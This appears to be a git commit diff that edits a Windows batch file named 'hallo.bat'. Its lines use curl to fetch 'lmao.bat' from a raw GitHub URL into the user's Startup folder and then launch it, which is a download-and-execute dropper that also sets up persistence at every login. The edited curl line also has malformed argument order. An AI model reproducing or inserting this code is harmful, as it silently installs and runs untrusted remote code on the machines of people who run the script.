862741058d04d01fe21f9f35aa27b097d51a4303
Jonathan <jonathan@bangert.dk>
2022-04-07 09:52:08 +0200

    Update hallo.bat

--- hallo.bat
+++ hallo.bat
@@ -1,2 +1,2 @@
-curl -P "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" -O https://raw.githubusercontent.com/Un10ck3d/glowing-broccoli/main/lmao.bat
+curl -o https://raw.githubusercontent.com/Un10ck3d/glowing-broccoli/main/lmao.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\lmao.bat"
